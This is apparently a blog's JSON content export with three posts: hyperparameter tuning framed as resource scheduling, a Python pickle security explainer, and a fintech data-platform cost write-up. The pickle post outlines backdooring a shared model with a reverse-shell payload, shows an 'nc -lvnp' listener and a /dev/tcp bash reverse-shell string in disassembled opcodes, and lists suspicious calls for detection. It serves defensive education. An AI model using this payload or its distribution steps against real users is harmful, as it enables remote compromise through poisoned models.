[{"content":"Hello ! This is my space for sharing ideas, code, and everything in between.\n","date":"2 May 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"2 May 2025","externalUrl":null,"permalink":"/posts/","section":"","summary":"","title":"","type":"posts"},{"content":"When you hear hyperparameter tuning, you might think of trying lots of different model settings to find the best one—maybe using grid search, random search, or some fancy algorithm. But when you\u0026rsquo;re doing this at scale, especially with limited time or compute, it\u0026rsquo;s not just about finding the best settings. It\u0026rsquo;s about how you manage your resources. You have a bunch of models to try, but you can’t run them all fully.\nSo, the real problem becomes: given your limited computer power, which sets of settings should you even bother trying? For the ones you start, which ones should you stop early if they don\u0026rsquo;t look promising? And which ones seem good enough that you should give them more time and resources to see how well they can really do?\nThat\u0026rsquo;s exactly what some advanced tuning methods like ASHA, Hyperband, and Population-Based Training do constantly. They are making decisions about starting, stopping, and giving more power to different trials.\nWhen you look at hyperparameter tuning this way, it stops feeling so much like a clever searching puzzle. Instead, it feels a lot like managing a list of tasks waiting to be done, where you have a limited budget of time and computer power. You have to decide which task to work on next, which ones to cut short if they\u0026rsquo;re not going well, and how to share your resources. That\u0026rsquo;s basically what a good scheduler does!\nWhat is HPO ? # Hyperparameter optimization (HPO) is the process of choosing the best values for hyperparameters in a machine learning model. Hyperparameters are the settings or configurations that you decide before training the model. Examples include:\nLearning rate: How fast the model learns from data. Batch size: The number of training samples used to update the model\u0026rsquo;s weights at each iteration. Number of layers in a neural network The space of possible hyperparameters is often vast, and the relationship between hyperparameters and model performance is typically non-linear and noisy. This means small changes in hyperparameters can lead to large fluctuations in performance.\nObjective Function # The goal of HPO is to identify the set of hyperparameters that maximize (or minimize) some performance measure, usually the validation accuracy or loss of a model after training. This is typically expressed as an objective function. $$\\text{maximize} \\ f(\\theta) = \\text{Accuracy}, \\quad \\text{or minimize} \\ f(\\theta) = \\text{Loss}$$\nThe challenge lies in the fact that evaluating \\(f(\\theta)\\) is often computationally expensive. It requires training a model with the specific hyperparameters \\(\\theta\\) and then evaluating its performance on a validation set. This process can take hours or even days, especially when working with large datasets or complex models.\nExample # Grid search is the most straightforward method. You define a grid of hyperparameter values, and the algorithm tries every possible combination. Let’s say you want to tune two hyperparameters: learning rate and batch size. You define the grid like this:\nLearning rates: 0.001, 0.01, 0.1 Batch sizes: 32, 64, 128 The grid search will try all combinations:\n(0.001, 32) (0.001, 64) (0.001, 128) (0.01, 32) (0.01, 64) \u0026hellip;\u0026hellip;\u0026hellip;.. This approach is called exhaustive search because you are testing every possible combination, ensuring you explore all options. But here’s the catch: Grid Search is computationally expensive. If the model takes a long time to train (say hours), and you have more hyperparameters or larger ranges, the time to complete all combinations can quickly become impractical.\nThis is where resource scheduling comes into play, especially in large-scale tasks, where you need to decide how to allocate limited computational resources efficiently.\nHPO as a Scheduling Problem # At a high level, hyperparameter optimization is about managing limited resources (like compute or time) and making decisions on which models to train, when to stop training them, and when to allocate more resources to the best-performing configurations.\nKey scheduling-like aspects of HPO:\nLimited Resources (Compute Budget):\nJust like in scheduling problems, HPO algorithms are constrained by available resources. The more resources we can allocate, the more hyperparameter configurations we can test.\nEvaluation Time (Task Duration):\nTraining a model with specific hyperparameters is time-consuming, like a long-running job in a job queue. Scheduling decisions are made on whether to keep running a long task or preempt it if other tasks seem more promising.\nExploration vs Exploitation (Job Allocation):\nExploration: Trying new or random configurations, akin to scheduling a new, untried job.\nExploitation: Allocating more resources to well-performing models, much like prioritizing jobs that are nearing completion and performing well.\nPreemption \u0026amp; Job Promotion:\nEarly stopping (preemption) of low-performing models is equivalent to canceling jobs that aren’t worth the resources. Promotion happens when a model performs well in early trials and gets more resources, similar to scheduling more CPU time for the jobs that are performing best.\nAdvanced Algorithms: Scheduling HPO # These algorithms make the most efficient use of limited resources, helping us find the best hyperparameters faster. Let\u0026rsquo;s break them down.\nASHA # ASHA (Asynchronous Successive Halving Algorithm) is a highly efficient method for optimizing hyperparameters that focuses on allocating resources in a way that eliminates poor-performing models early, allowing us to concentrate computational power on the promising ones. It\u0026rsquo;s an enhancement of the traditional Successive Halving (SH) method, but with the added benefit of asynchrony, meaning we can evaluate multiple configurations in parallel, speeding up the process. Initial Allocation: Each model starts with a small amount of resources, \\( r_0 \\).\n$$ r_0 = \\text{Initial Resources (e.g., 1 epoch)} $$\nSubsequent Allocation: After each stage, allocate more resources to the remaining models.\n$$ r_s = r_0 \\times \\eta^s $$\nWhere \\( \\eta \\) is the scaling factor (typically 2 or 3), and \\( s \\) is the stage number.\nRemaining Models: At each stage, the number of models is reduced by a factor of \\( \\eta \\), i.e., only the top-performing \\( \\frac{1}{\\eta} \\) fraction of models are retained. $$ N * s = \\frac{N*{s-1}}{\\eta} $$\nHyperband # Hyperband is an enhancement of Successive Halving (SH) that allocates resources to different configurations in parallel, speeding up hyperparameter optimization (HPO).In the early stages, it explores the hyperparameter space with smaller resource budgets (Exploration), Later, it reallocates more resources to the best-performing models (Exploitation)\nParallel Successive Halving: Hyperband runs multiple SH processes in parallel with different initial resource budgets, exploring various configurations at different levels of commitment.\nResource Allocation: The resource for each stage \\( s \\) is calculated as:\n$$ r_s = r_0 \\times \\eta^s $$\nWhere:\n\\( r_0 \\) is the initial resource, \\( \\eta \\) is the reduction factor (e.g., 2 or 3), \\( s \\) is the current stage. Resource Scaling: Resources grow exponentially at each stage. For example, if \\( r_0 = 1 \\) and \\( \\eta = 2 \\):\nAt \\( s = 1 \\): \\( r_1 = 1 \\times 2^1 = 2 \\) At \\( s = 2 \\): \\( r_2 = 1 \\times 2^2 = 4 \\) At \\( s = 3 \\): \\( r_3 = 1 \\times 2^3 = 8 \\) Trials Reduction: At each stage, the number of trials \\( N*s \\) decreases exponentially:\n$$ N_s = \\frac{N*{s-1}}{\\eta} $$\nTotal Computational Budget: The total budget \\( B \\) is split across stages, where: $$ B = \\sum_{s=0}^{S} r_s \\times N_s $$ This ensures that more resources are allocated to the better-performing models as the process progresses.\nPopulation-Based Training (PBT) # PBT is a more advanced method where multiple models (the \u0026ldquo;population\u0026rdquo;) are trained in parallel, and their hyperparameters are evolved over time. The idea is to explore hyperparameters and exploit good ones by periodically \u0026ldquo;mutating\u0026rdquo; hyperparameters of the best models and copying them to weaker models. Typical Flow of PBT:\nInitialization: The models are initialized with a set of random hyperparameters \\( \\theta_0 \\).\n$$ \\theta_0 = \\text{Random Initialization of Hyperparameters} $$\nEvaluation and Selection: After training, models are ranked based on performance (e.g., validation loss). The best-performing models are selected:\n$$ \\text{Top Models} = { \\theta^* } $$\nMutation: Hyperparameters of the top models are perturbed to create new configurations. $$ \\theta_{\\text{new}} = \\theta^* + \\Delta \\theta $$ Where \\( \\Delta \\theta \\) is a random perturbation.\nComparison # HPO Concept ASHA Hyperband PBT Resource Allocation Allocates more resources to better-performing models Similar to ASHA but with more exploration Mutates best models, reallocates resources Early Stopping Eliminates poorly performing models early Similar to ASHA Evaluates and evolves the population of models Exploration vs Exploitation Explores a wide range, then exploits top models Balances exploration and exploitation Exploits best-performing models, mutates others Scheduling Analogy Job preemption, task prioritization Job parallelism, dynamic scheduling Task migration, job evolution Future Trends # Meta-Learning: Meta-learning optimizes hyperparameters by learning from past optimization experiences, typically via optimization of a meta-objective function. Evolutionary Algorithms: Evolutionary algorithms like genetic algorithms are used for more adaptive search strategies. They simulate natural selection processes to iteratively evolve better-performing solutions [1] Research Gate Article\n[2] Ray Scheduler\n","date":"2 May 2025","externalUrl":null,"permalink":"/posts/hyperparameter-optimisation/","section":"","summary":"","title":"Hyperparameter Tuning is just a Resource Scheduling Problem","type":"posts"},{"content":"","date":"2 May 2025","externalUrl":null,"permalink":"/tags/ml/","section":"Tags","summary":"","title":"ML","type":"tags"},{"content":"","date":"2 May 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"13 March 2025","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":" Intro # Python’s pickle module is a popular way to save and load objects. It’s used in machine learning, data science, and web applications to store models, cache data, and transfer objects between processes. However, pickle has a major security flaw —it can execute arbitrary code when loading data. This makes it risky, especially when handling untrusted files.\nIn this post, we are going to dive deep into how pickle works, all the way down to the assembly language level. We\u0026rsquo;ll explore how Python objects are turned into pickle data, how that data is executed by the Python interpreter, and how malicious pickle files can be used to exploit vulnerabilities.\nHow does it work ? # The Python pickle module implements a serialization (pickling) and deserialization (unpickling) protocol that translates arbitrary Python objects into a byte stream, and vice versa. The pickle module operates a separate stack-based virtual machine, distinct from CPython’s VM, processing a sequence of opcodes to reconstruct objects. Essentially, pickle functions like a mini interpreter, executing its own opcodes from a binary stream, similar to how Python’s main interpreter loop runs bytecode. However, unlike Python bytecode, which has safety checks, pickle opcodes can invoke arbitrary functions, making it inherently unsafe.\nThese Pickle opcodes can be categorized into several groups:\nStack Manipulation: Control the VM\u0026rsquo;s stack, managing the flow of data during serialization and deserialization. Data Loading: Responsible for pushing literal values and container objects onto the stack. Object Construction: Used to instantiate Python objects, invoking their constructors and setting their attributes. Function Invocation: Enable the invocation of arbitrary functions and the loading of global variables, which are critical for supporting complex object serialization. Memoization: Handles object references and memoization, allowing the protocol to efficiently serialize and deserialize cyclic object graphs. The complete set of pickle opcodes is defined and implemented within the CPython source code file Lib/pickletools.py and opcode handling by Modules/_pickle.c\nPickle uses __reduce__ or __reduce_ex__ to customize serialization for objects, employing opcodes like GLOBAL and REDUCE. To manage object references and handle cycles, it utilizes a memo and PUT/GET opcodes, ensuring efficient reconstruction.\nExample # This pickle sequence represents a simple dictionary with one key-value pair. Let’s break it down by opcode groups:\nProtocol and Framing PROTO 4 (\\x80 4): Specifies that this pickle uses protocol version 4. FRAME 34 (\\x95 34): Indicates that 34 bytes are allocated for this pickle data. Stack Manipulation \u0026amp; Data Loading EMPTY_DICT (}): Pushes an empty dictionary {} onto the stack. MEMOIZE (\\x94): Stores this dictionary in memory at index 0. SHORT_BINUNICODE 'title' (\\x8c 'title'): Loads the string \u0026ldquo;title\u0026rdquo; onto the stack and stores it in memory at index 1. SHORT_BINUNICODE 'Welcome to my blog!' (\\x8c 'Welcome to my blog!'): Loads the string \u0026ldquo;Welcome to my blog!\u0026rdquo; onto the stack and stores it in memory at index 2. Object Construction SETITEM (s): Pops the key and value from the stack and inserts them into the dictionary. Termination STOP (.): Ends deserialization. Example - Regression Model # Lets analyse a simple linear regression model\n1. Identifying the Stored Object # 11: \\x8c SHORT_BINUNICODE \u0026#39;sklearn.linear_model._base\u0026#39; 39: \\x94 MEMOIZE (as 0) 40: \\x8c SHORT_BINUNICODE \u0026#39;LinearRegression\u0026#39; 58: \\x94 MEMOIZE (as 1) 59: \\x93 STACK_GLOBAL 60: \\x94 MEMOIZE (as 2) The pickle stream begins by storing the class path 'sklearn.linear_model._base' and the class name 'LinearRegression'. The STACK_GLOBAL opcode (\\x93) constructs the LinearRegression class. At this stage, the object is not yet initialized, just referenced. 2. Creating the Object # 61: ) EMPTY_TUPLE 62: \\x81 NEWOBJ 63: \\x94 MEMOIZE (as 3) 64: } EMPTY_DICT 65: \\x94 MEMOIZE (as 4) EMPTY_TUPLE (\\x61): No constructor arguments (LinearRegression() has default parameters). NEWOBJ (\\x81): Calls the class constructor. An empty dictionary ({}) is allocated to store the object\u0026rsquo;s attributes. 3. Storing Model Parameters # The pickle file then stores key attributes of the LinearRegression model.\n3.1 Model Hyperparameters # 67: \\x8c SHORT_BINUNICODE \u0026#39;fit_intercept\u0026#39; 82: \\x94 MEMOIZE (as 5) 83: \\x88 NEWTRUE 84: \\x8c SHORT_BINUNICODE \u0026#39;normalize\u0026#39; 95: \\x94 MEMOIZE (as 6) 96: \\x8c SHORT_BINUNICODE \u0026#39;deprecated\u0026#39; 108: \\x94 MEMOIZE (as 7) 109: \\x8c SHORT_BINUNICODE \u0026#39;copy_X\u0026#39; 117: \\x94 MEMOIZE (as 8) 118: \\x88 NEWTRUE 119: \\x8c SHORT_BINUNICODE \u0026#39;n_jobs\u0026#39; 127: \\x94 MEMOIZE (as 9) 128: N NONE 129: \\x8c SHORT_BINUNICODE \u0026#39;positive\u0026#39; 139: \\x94 MEMOIZE (as 10) 140: \\x89 NEWFALSE fit_intercept=True normalize=deprecated (this was removed in sklearn\u0026gt;=0.24) copy_X=True n_jobs=None positive=False 3.2 Number of Features # 141: \\x8c SHORT_BINUNICODE \u0026#39;n_features_in_\u0026#39; 157: \\x94 MEMOIZE (as 11) 158: K BININT1 1 Stores n_features_in_ = 1, meaning the model was trained on a single feature. 3.3 Model Coefficients (coef_) # 160: \\x8c SHORT_BINUNICODE \u0026#39;coef_\u0026#39; 167: \\x94 MEMOIZE (as 12) 168: \\x8c SHORT_BINUNICODE \u0026#39;numpy.core.multiarray\u0026#39; 191: \\x94 MEMOIZE (as 13) 192: \\x8c SHORT_BINUNICODE \u0026#39;_reconstruct\u0026#39; 206: \\x94 MEMOIZE (as 14) 207: \\x93 STACK_GLOBAL 208: \\x94 MEMOIZE (as 15) 209: \\x8c SHORT_BINUNICODE \u0026#39;numpy\u0026#39; 216: \\x94 MEMOIZE (as 16) 217: \\x8c SHORT_BINUNICODE \u0026#39;ndarray\u0026#39; 226: \\x94 MEMOIZE (as 17) 227: \\x93 STACK_GLOBAL 228: \\x94 MEMOIZE (as 18) Stores the NumPy array representing coef_. The coef_ array is reconstructed using NumPy’s _reconstruct method. 233: C SHORT_BINBYTES b\u0026#39;b\u0026#39; b'b' represents the byte-encoded coefficient value. 3.4 Singular Values \u0026amp; Rank (For Least Squares Solution) # 321: \\x8c SHORT_BINUNICODE \u0026#39;singular_\u0026#39; 332: \\x94 MEMOIZE (as 34) Stores singular values from the least squares solution. 357: C SHORT_BINBYTES b\u0026#39;\\xcd;\\x7ff\\x9e\\xa0\\xf6?\u0026#39; Stores a floating-point singular value. 3.5 Model Intercept (intercept_) # 371: \\x8c SHORT_BINUNICODE \u0026#39;intercept_\u0026#39; 383: \\x94 MEMOIZE (as 41) Stores the intercept term. 399: C SHORT_BINBYTES b\u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\xd0\u0026lt;\u0026#39; The raw byte representation of the intercept value. 4. Storing Scikit-Learn Version # 414: \\x8c SHORT_BINUNICODE \u0026#39;_sklearn_version\u0026#39; 432: \\x94 MEMOIZE (as 47) 433: \\x8c SHORT_BINUNICODE \u0026#39;1.1.3\u0026#39; 440: \\x94 MEMOIZE (as 48) This records the Scikit-learn version used when the model was trained (1.1.3). This helps with compatibility checks during unpickling. 5. Finalizing Object Construction # 441: u SETITEMS (MARK at 66) 442: b BUILD 443: . STOP SETITEMS (u) assigns all the stored attributes (coef_, intercept_, fit_intercept, etc.) to the LinearRegression object. BUILD (b) completes the object reconstruction. STOP (.) signals the end of the pickle file. Injecting a Backdoor into an AI Model # AI models are being shared everywhere—on Hugging Face, Kaggle, and GitHub—making it easy for developers to use and improve them. Now, imagine a backdoored AI model—one that not only performs its advertised ML task but also executes a hidden reverse shell when unpickled.\nCrafting a malicious payload # This code initiates a reverse shell when unpickled, establishing a TCP connection to an attacker’s machine. This allows remote command execution on the victim’s system. If injected into an AI model and shared on public repositories, unsuspecting users could unknowingly compromise their devices.\nHow an Attacker Could Exploit This # Start a listener on their machine: nc -lvnp 9001 Distribute the malicious .pkl file via platforms like GitHub or Hugging Face. Wait for a victim to load the model. Obtain full remote access to the compromised machine. ⚠️ Warning: This demonstration is for educational purposes only and underscores the dangers of untrusted pickle files.\nDisassembling the payload # Look for unexpected imports (subprocess, os, Popen, eval, exec, socket, shutil, ctypes, multiprocessing). Check if REDUCE, GLOBAL, NEWOBJ call dangerous functions (e.g., os.system, subprocess.Popen, eval, exec). Watch for shell commands (/bin/bash, sh, cmd.exe, powershell.exe). Detect file system access (open, os.remove, shutil.rmtree, os.chmod, os.unlink). Monitor for network activity (socket, requests.get, urllib.request.urlopen). Watch for excessive memory usage (bytearray(999999999), b\u0026quot;\\x00\u0026quot; * 999999999). For the above payload, these are the opcodes which indicate security risk\n154: \\x8c SHORT_BINUNICODE \u0026#39;subprocess\u0026#39; 167: \\x8c SHORT_BINUNICODE \u0026#39;Popen\u0026#39; 180: \\x8c SHORT_BINUNICODE \u0026#39;/bin/bash\u0026#39; 192: \\x8c SHORT_BINUNICODE \u0026#39;-c\u0026#39; 197: \\x8c SHORT_BINUNICODE \u0026#39;exec 5\u0026lt;\u0026gt;/dev/tcp/127.0.0.1/9001; cat \u0026lt;\u0026amp;5 | while read line; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done\u0026#39; 286: R REDUCE Mitigation - Strategy # Layer 1: Attack Mitigation # Prevent Poisoned Models \u0026amp; Untrusted Pickles Never unpickle files from untrusted sources. Use safer alternatives like ONNX, SafeTensors, TorchScript Disassemble and inspect pickle files using pickletools.dis(). AI Firewalls \u0026amp; Screening Tools Defensive Training Techniques Distribute training across sub-models to reduce attack impact. Automatic Patch Management Layer 2: Model Security # Explainable AI (XAI) \u0026amp; Continuous Validation Improve model transparency to detect security weaknesses early. Conduct continuous testing to monitor evolving vulnerabilities. Restrict Arbitrary Code Execution Disable __reduce__ and other serialization-related functions in untrusted models. Use sandboxing techniques to execute models in isolated environments (Docker, VMs). Layer 3: Infrastructure Security # Access Control \u0026amp; Isolation\nPolicy-Based Access Control (PBAC): Restrict unauthorized access at scale. Network Segmentation**: Prevent attackers from escalating privileges across systems. Monitoring \u0026amp; Response\nSecurity Orchestration, Automation, and Response (SOAR): Automate real-time threat detection. AI Observability \u0026amp; Logging: Continuously monitor for anomalous behavior in model execution. As AI adoption accelerates, so do adversarial attacks targeting the ML supply chain. We must be prepared for these supply chain attacks and rethink how we store, share, and deploy machine learning models to ensure the security and integrity of our AI system\n[1] https://granica.ai/blog/ai-security-concerns-grc\n","date":"13 March 2025","externalUrl":null,"permalink":"/posts/python-pickle/","section":"","summary":"","title":"The Dark Side of Python’s pickle – How to Backdoor an AI Model","type":"posts"},{"content":"","date":"27 February 2025","externalUrl":null,"permalink":"/tags/data/","section":"Tags","summary":"","title":"Data","type":"tags"},{"content":"Building and managing a data platform that is both scalable and cost-effective is a challenge many organizations face. We managed an extensive data lake with a lean data team and reduced our Infra Cost by 70%.\nThis article explores how we built it and the lessons we learned. Hopefully, some of these insights will be useful (or at least interesting!) for your own data platform projects, regardless of your team size.\nOur Data Landscape # We are a fintech startup helping SMEs raise capital from our platform where we provide diverse financial products ranging from Term Loan, Revenue Based Financing to Syndication, we face one unique data challenge: Our data comes from everywhere.\nOur clients often manage their financial information in different ways, leading to data sources ranging from the structured data in our MongoDB and PostgreSQL databases to the semi-structured data found in marketplaces, Google Sheets, and various payment platforms.\nStoring the data was only part of the equation. We needed to process and analyse it at scale, transform it into actionable intelligence that drive key business decisions. Our data and BI analysts play a crucial role in this process, requiring robust data tooling to effectively access, analyze, and visualize the data. From lead generation and risk analysis to payment alerting and reconciliation, data is at the heart of our operations, and our data platform needs to support these critical workflows throughout the entire application lifecycle.\nOur Initial Data Platform # Our initial data platform was built on a foundation of tools that addressed our early-stage needs, but quickly became insufficient as we scaled. Data ingestion was primarily handled by Hevo, which leveraged Debezium Slots for capturing CDC events from our databases and direct integration with Google Sheets. While Hevo simplified initial data capture, its data transformation capabilities were limited, primarily offering basic functionality like data key deletion and value formatting.\nRevenue data from marketplaces was ingested through an RPA-driven process, with data being directly ingested into Google BigQuery (GBQ) as raw dumps. While this approach was simpler, it came with high costs, as GBQ is priced based on the amount of data queried. Given that the data sizes for each table were in the order of 200-500GBs, the costs quickly escalated.\nFurthermore, a significant portion of queries were executed directly against our live OLTP tables. This direct querying increased the load on our production databases, impacting performance and further contributing to cost increases.\nIn the early days, with a smaller team and less data, these engineering decisions were pragmatic and likely solved the immediate problems. However, as our company grew and data demands increased, it became clear that this solution was not scalable and could not meet our evolving requirements. This realization led to the creation of a new data team, with myself and my manager, Aankesh 1, tasked with building a more robust and scalable data platform. We needed a platform that could handle the volume, variety, and complexity of our data, while also providing the necessary tools for efficient analysis and decision-making.\nOur New Data Platform # We implemented an ELT stack for our new data platform, leveraging cheap storage to prioritize raw data ingestion and subsequent in-warehouse transformations. We also strategically reused existing software components where they weren\u0026rsquo;t being fully utilized, further optimizing our development efforts.\nThe platform\u0026rsquo;s development was segmented into two layers: Data Ingestion and Storage \u0026amp; Compute.\nData Ingestion Layer # Debezium: Implemented for capturing CDC events from PostgreSQL and MongoDB, enabling real-time data replication. Airflow: Utilized to orchestrate manual data ingestion from sources like Google Sheets and CSV files. Kafka \u0026amp; Kafka Connect: Formed the core of our streaming data pipeline. Leveraged custom Single Message Transforms (SMTs) for specialized transformations. Self-managed and hosted Kafka Connect cluster for fine-grained control. Utilized managed Confluent Cloud for our Kafka Connect cluster, leveraging our existing infrastructure used for application pub-sub systems. Sink Connectors: Employed Kafka Connect Sink Connectors to deliver data to downstream destinations, including: File storage (S3). PostgreSQL for data replication. Storage \u0026amp; Compute Layer # Data Storage All raw data, ingested from our diverse sources, is persisted in file storage (S3) in Parquet format. This choice offers significant advantages: Parquet\u0026rsquo;s columnar storage optimizes query performance, and S3 provides cost-effective and highly durable storage. Data Transformation and Quality Airflow orchestrates dbt runs, enabling us to build modular, testable, and maintainable data transformation pipelines. dbt\u0026rsquo;s transformation logic, expressed as SQL, simplifies the process and allows for version control. Great Expectations is integrated into our pipelines to ensure comprehensive data validation checks at every stage. This helps us detect and address data quality issues early, preventing downstream errors. dbt docs are used for good documentations. This allows for data lineage tracking, and helps downstream consumers discover and understand the datasets we curate for them. Ad-Hoc Analysis Depending on dataset size and query patterns, we also leverage DuckDB for ad-hoc analysis and rapid prototyping. DuckDB\u0026rsquo;s in-process, embeddable nature allows for fast, interactive querying, particularly for smaller datasets or exploratory analysis. Medallion Architecture: Organizing Data for Consumption We implemented a medallion architecture (Bronze, Silver, Gold) to organize our data for optimal consumption. The Bronze layer stores raw data, the Silver layer contains cleaned and conformed data, and the Gold layer provides business-ready datasets. The Gold layer is further refined to create fine-grained datasets tailored to specific data access patterns. This approach minimizes data scanning during queries, significantly optimizing query performance, especially for frequently accessed data. To enable efficient data discovery and querying:\nData Discovery: Data Indexing and Metastore AWS Glue crawlers automatically index data in S3, updating metadata as new data arrives. The AWS Glue Data Catalog serves as our Hive Metastore, providing a centralized repository for metadata. This allows Trino to efficiently locate and access data across our data lake. Querying and Visualization Trino is integrated with the Hive Metastore for distributed querying, enabling us to query data across our data lake using standard SQL. Trino\u0026rsquo;s ability to federate queries across multiple data sources provides flexibility. Metabase is linked to Trino, providing a user-friendly data visualization layer. This empowers our data and BI teams to create interactive reports and dashboards, driving data-driven decisions throughout the organization. Analyzing the Cost Reduction # Our cost reduction was realized through maximizing the utilization of our current infrastructure and transitioning away from expensive managed services.\nOld Data Platform New Architecture Hevo: 300~500$ Connect Cluster : ~150$ GBQ : ~750$ Airflow: ~160$ Postgres: 1000$ Trino: ~160$ Glue: ~10$ Total: ~2200$ * Total: ~460$ * * All costs are monthly.\nAcknowledgments # I would like to thank my stunning data team and managers - Aankesh, Deepak and Prashant for enabling the team\nAankesh is Senior Engineering Manager managing the Repayments, Risk, and Data Engineering teams, providing leadership for various storage technologies.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"27 February 2025","externalUrl":null,"permalink":"/posts/data-infra/","section":"","summary":"","title":"How we built a Scalable Data Platform","type":"posts"},{"content":"","date":"27 February 2025","externalUrl":null,"permalink":"/tags/platform/","section":"Tags","summary":"","title":"Platform","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]